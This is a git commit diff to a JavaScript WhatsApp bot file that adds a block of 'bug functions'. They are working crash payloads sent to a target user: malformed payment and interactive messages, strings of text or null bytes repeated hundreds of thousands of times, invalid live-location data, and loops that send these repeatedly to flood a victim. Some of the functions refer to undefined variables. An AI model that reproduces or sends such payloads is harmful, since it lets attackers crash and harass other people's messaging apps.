38283837668c7c58bd182875958965ecf3231c39
Opeyemi💕💕 <adeshokanopeyemi980@gmail.com>
2024-09-09 17:59:15 +0100

    Update XeonCheems13.js

--- XeonCheems13.js
+++ XeonCheems13.js
@@ -354,6 +354,481 @@ participant: '0@s.whatsapp.net'
 }
 };
 //bug functions
+const force = {
+key: {
+participant: `0@s.whatsapp.net`,
+...(m.chat ? {
+remoteJid: "status@broadcast"
+} : {})
+},
+'message': {
+"interactiveMessage": { 
+"header": {
+"hasMediaAttachment": true,
+"jpegThumbnail": fs.readFileSync(`./src/data/function/XBug/xx1.png`)
+},
+"nativeFlowMessage": {
+"buttons": [
+{
+"name": "review_and_pay",
+"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+}
+]
+}
+}
+}
+}
+
+const force2 = {
+key: {
+participant: `0@s.whatsapp.net`,
+...(m.chat ? {
+remoteJid: "status@broadcast"
+} : {})
+},
+'message': {
+"interactiveMessage": { 
+"header": {
+"hasMediaAttachment": true,
+"jpegThumbnail": fs.readFileSync(`./src/data/function/XBug/xx1.png`)
+},
+"nativeFlowMessage": {
+"buttons": [
+{
+"name": "review_and_pay",
+"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+}
+]
+}
+}
+}
+}
+
+const oneclickxeon = {
+key: {
+participant: `0@s.whatsapp.net`,
+...(m.chat ? {
+remoteJid: "status@broadcast"
+} : {})
+},
+message: {
+listResponseMessage: {
+title: `🦄드림 가이 Xeon`
+}
+}
+}
+async function blackening(target, kuwoted) {
+ var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+  "stickerMessage": {
+    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
+    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
+    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
+    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
+    "mimetype": "image/webp",
+    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
+    "fileLength": "10116",
+    "mediaKeyTimestamp": "1715876003",
+    "isAnimated": false,
+    "stickerSentTs": "1715881084144",
+    "isAvatar": false,
+    "isAiSticker": false,
+    "isLottie": false
+  }
+}), { userJid: target, quoted: kuwoted });
+await XeonBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
+}
+
+async function locationxeony(target, kuwoted) {
+var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+viewOnceMessage: {
+message: {
+  "liveLocationMessage": {
+    "degreesLatitude": "p",
+    "degreesLongitude": "p",
+    "caption": `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`+"ꦾ".repeat(50000),
+    "sequenceNumber": "0",
+    "jpegThumbnail": ""
+     }
+  }
+}
+}), { userJid: target, quoted: kuwoted })
+await XeonBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
+}
+
+async function xeonkillpic(target, kuwoted) {
+ var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+    interactiveMessage: {
+      header: {
+        title: "🦄드림 가이 Xeon",
+        hasMediaAttachment: true,
+        ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/Wppj16p/cheemspic.jpg" } }, { upload: XeonBotInc.waUploadToServer }))
+      },
+      body: {
+        text: ""
+      },
+      footer: {
+        text: "›          #🦄드림 가이 Xeon"
+      },
+      nativeFlowMessage: {
+        messageParamsJson: "".repeat(1000000)
+      }
+    }
+}), { userJid: target, quoted: kuwoted });
+await XeonBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
+}
+
+async function aipong(target) {
+await XeonBotInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
+}
+
+async function listxeonfck(target, kuwoted) {
+ var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+  'listMessage': {
+    'title': "🦄드림 가이 Xeon"+"".repeat(920000),
+        'footerText': `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`,
+        'description': `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`,
+        'buttonText': null,
+        'listType': 2,
+        'productListInfo': {
+          'productSections': [{
+            'title': 'anjay',
+            'products': [
+              { "productId": "4392524570816732" }
+            ]
+          }],
+          'productListHeaderImage': {
+            'productId': '4392524570816732',
+            'jpegThumbnail': null
+          },
+          'businessOwnerJid': '0@s.whatsapp.net'
+        }
+      },
+      'footer': 'puki',
+      'contextInfo': {
+        'expiration': 604800,
+        'ephemeralSettingTimestamp': "1679959486",
+        'entryPointConversionSource': "global_search_new_chat",
+        'entryPointConversionApp': "whatsapp",
+        'entryPointConversionDelaySeconds': 9,
+        'disappearingMode': {
+          'initiator': "INITIATED_BY_ME"
+        }
+      },
+      'selectListType': 2,
+      'product_header_info': {
+        'product_header_info_id': 292928282928,
+        'product_header_is_rejected': false
+      }
+    }), { userJid: target, quoted: oneclickxeon });
+await XeonBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
+}
+
+
+const sendReaction = async reactionContent => {
+  XeonBotInc.sendMessage(m.chat, {
+    'react': {
+      'text': reactionContent,
+      'key': m.key
+    }
+  });
+};
+
+async function sendRepeatedMessages(jid, count) {
+  for (let i = 0; i < count; i++) {
+   XeonBotInc.sendMessage(recipientJid, {
+      'text': ''.repeat(50000)
+    }, {
+      'participant': {
+        'jid': jid
+      },
+      'messageId': etc.key.id
+    }, {
+      'quoted': m
+    });
+  }
+}
+
+async function sendViewOnceMessages(jid, count) {
+  for (let i = 0; i < count; i++) {
+    let messageContent = generateWAMessageFromContent(jid, {
+      'viewOnceMessage': {
+        'message': {
+          'messageContextInfo': {
+            'deviceListMetadata': {},
+            'deviceListMetadataVersion': 2
+          },
+          'interactiveMessage': proto.Message.InteractiveMessage.create({
+            'body': proto.Message.InteractiveMessage.Body.create({
+              'text': ''
+            }),
+            'footer': proto.Message.InteractiveMessage.Footer.create({
+              'text': ''
+            }),
+            'header': proto.Message.InteractiveMessage.Header.create({
+              'title': '',
+              'subtitle': '',
+              'hasMediaAttachment': false
+            }),
+            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
+              'buttons': [{
+                'name': "cta_url",
+                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
+              }],
+              'messageParamsJson': "\0".repeat(100000)
+            })
+          })
+        }
+      }
+    }, {});
+    XeonBotInc.relayMessage(jid, messageContent.message, {
+      'messageId': messageContent.key.id
+    });
+  }
+}
+
+async function sendSystemCrashMessage(jid) {
+  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+    'viewOnceMessage': {
+      'message': {
+        'interactiveMessage': {
+          'header': {
+            'title': '',
+            'subtitle': " "
+          },
+          'body': {
+            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
+          },
+          'footer': {
+            'text': 'xp'
+          },
+          'nativeFlowMessage': {
+            'buttons': [{
+              'name': 'cta_url',
+              'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
+            }],
+            'messageParamsJson': "\0".repeat(1000000)
+          }
+        }
+      }
+    }
+  }), {
+    'userJid': jid
+  });
+  await XeonBotInc.relayMessage(jid, messageContent.message, {
+    'participant': {
+      'jid': jid
+    },
+    'messageId': messageContent.key.id
+  });
+}
+async function sendListMessage(jid) {
+  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+    'listMessage': {
+      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
+      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
+      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
+      'buttonText': null,
+      'listType': 2,
+      'productListInfo': {
+        'productSections': [{
+          'title': "lol",
+          'products': [{
+            'productId': "4392524570816732"
+          }]
+        }],
+        'productListHeaderImage': {
+          'productId': "4392524570816732",
+          'jpegThumbnail': null
+        },
+        'businessOwnerJid': "0@s.whatsapp.net"
+      }
+    },
+    'footer': "lol",
+    'contextInfo': {
+      'expiration': 600000,
+      'ephemeralSettingTimestamp': "1679959486",
+      'entryPointConversionSource': "global_search_new_chat",
+      'entryPointConversionApp': "whatsapp",
+      'entryPointConversionDelaySeconds': 9,
+      'disappearingMode': {
+        'initiator': "INITIATED_BY_ME"
+      }
+    },
+    'selectListType': 2,
+    'product_header_info': {
+      'product_header_info_id': 292928282928,
+      'product_header_is_rejected': false
+    }
+  }), {
+    'userJid': jid
+  });
+  
+  await XeonBotInc.relayMessage(jid, messageContent.message, {
+    'participant': {
+      'jid': jid
+    },
+    'messageId': messageContent.key.id
+  });
+}
+
+async function sendLiveLocationMessage(jid) {
+  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+    'viewOnceMessage': {
+      'message': {
+        'liveLocationMessage': {
+          'degreesLatitude': 'p',
+          'degreesLongitude': 'p',
+          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
+          'sequenceNumber': '0',
+          'jpegThumbnail': ''
+        }
+      }
+    }
+  }), {
+    'userJid': jid
+  });
+  
+  await XeonBotInc.relayMessage(jid, messageContent.message, {
+    'participant': {
+      'jid': jid
+    },
+    'messageId': messageContent.key.id
+  });
+}
+
+async function sendExtendedTextMessage(jid) {
+  XeonBotInc.relayMessage(jid, {
+    'extendedTextMessage': {
+      'text': '.',
+      'contextInfo': {
+        'stanzaId': jid,
+        'participant': jid,
+        'quotedMessage': {
+          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
+        },
+        'disappearingMode': {
+          'initiator': "CHANGED_IN_CHAT",
+          'trigger': "CHAT_SETTING"
+        }
+      },
+      'inviteLinkGroupTypeV2': "DEFAULT"
+    }
+  }, {
+    'participant': {
+      'jid': jid
+    }
+  }, {
+    'messageId': null
+  });
+}
+async function sendPaymentInvite(jid) {
+  XeonBotInc.relayMessage(jid, {
+    'paymentInviteMessage': {
+      'serviceType': "UPI",
+      'expiryTimestamp': Date.now() + 86400000
+    }
+  }, {
+    'participant': {
+      'jid': jid
+    }
+  });
+}
+
+async function sendMultiplePaymentInvites(jid, count) {
+  for (let i = 0; i < count; i++) {
+    sendPaymentInvite(jid);
+    sendExtendedTextMessage(jid);
+    await sleep(500);
+  }
+}
+
+async function sendVariousMessages(jid, count) {
+  for (let i = 0; i < count; i++) {
+    sendListMessage(jid);
+    sendLiveLocationMessage(jid);
+    sendSystemCrashMessage(jid);
+    await sleep(500);
+  }
+}
+
+async function sendRepeatedMessages2(jid, count) {
+  for (let i = 0; i < count; i++) {
+    sendSystemCrashMessage(jid);
+    sendSystemCrashMessage(jid);
+    sendSystemCrashMessage(jid);
+    await sleep(500);
+  }
+}
+
+async function sendMixedMessages(jid, count) {
+  for (let i = 0; i < count; i++) {
+    sendLiveLocationMessage(jid);
+    sendListMessage(jid);
+    await sleep(500);
+  }
+}
+
+function sendMessageWithMentions(text, mentions = [], quoted = false) {
+  if (quoted == null || quoted == undefined || quoted == false) {
+    return XeonBotInc.sendMessage(m.chat, {
+      'text': text,
+      'mentions': mentions
+    }, {
+      'quoted': m
+    });
+  } else {
+    return XeonBotInc.sendMessage(m.chat, {
+      'text': text,
+      'mentions': mentions
+    }, {
+      'quoted': m
+    });
+  }
+}
+
+const xbug2 = {
+key: {
+remoteJid: 'status@broadcast',
+fromMe: false, 
+participant: '0@s.whatsapp.net'
+},
+message: {
+listResponseMessage: {
+title: botname
+}
+}
+}
+
+const fakeflow = {
+key: {
+remoteJid: 'status@broadcast',
+fromMe: false,
+participant: '0@s.whatsapp.net'
+},
+'message': {
+"interactiveMessage": {
+"header": {
+"hasMediaAttachment": true,
+"jpegThumbnail": bimg
+},
+"nativeFlowMessage": {
+"buttons": [
+{
+"name": "review_and_pay",
+"buttonParamsJson": `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${botname}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${ownername}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
+}
+]
+}
+}
+}
+};
+
+const xeonimun = (texto) => {
+XeonBotInc.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
+return reply("Erro..")
+})
+}
+
 const subscribe_dgxeon = {
 "key": { 
 "fromMe": false,
@@ -556,7 +1031,7 @@ return arr[Math.floor(Math.random() * arr.length)]
                   if (!('antiviewonce' in chats)) chats.antiviewonce = false
                   if (!('antispam' in chats)) chats.antispam = false
                   if (!('antimedia' in chats)) chats.media = false
-                  if (!('antivirtex' in chats)) chats.antivirtex = false
+                  if (!('antivirtex' in chats)) chats.antivirtex = true
                   if (!('antiimage' in chats)) chats.antiimage = false
                   if (!('antivideo' in chats)) chats.video = false
                   if (!('antiaudio' in chats)) chats.antiaudio = false
